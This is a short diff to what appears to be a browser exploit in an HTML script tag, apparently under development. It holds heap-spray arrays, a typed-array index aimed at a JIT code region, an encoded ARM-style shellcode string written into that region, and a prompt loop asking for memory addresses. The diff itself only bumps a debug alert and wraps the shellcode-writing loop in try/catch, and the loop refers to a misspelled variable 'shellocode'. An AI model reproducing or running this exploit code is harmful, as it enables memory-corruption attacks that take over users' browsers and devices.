@@ -1,5 +1,5 @@
 <script>	
-alert("start42");
+alert("start43");
 function func(){
 for(var i=0;i<0x1000;i++){ 
 
@@ -154,10 +154,14 @@ var jit_index=typedarray_index+0x38/4;
 var typedarray=spray[spray_index];
 var myarr=arrcvs[0];
 var shellcode="\ub004\ue52d";//\ub000\ue28d\u3002\ue3a0\u0003\ue1a0\ud000\ue28b\u0800\ue8bd\uff1e\ue12f";
-for(var i=0;i<shellocode.length;i++){
+try{
+ for(var i=0;i<shellocode.length;i++){
  myarr[0]=shellcode.charCodeAt(i);
  typedarray[jit_index]+=2;
  alert(i);
+}
+}catch(e){
+ alert(e);
 }
 while(1){
 a=prompt("addr");
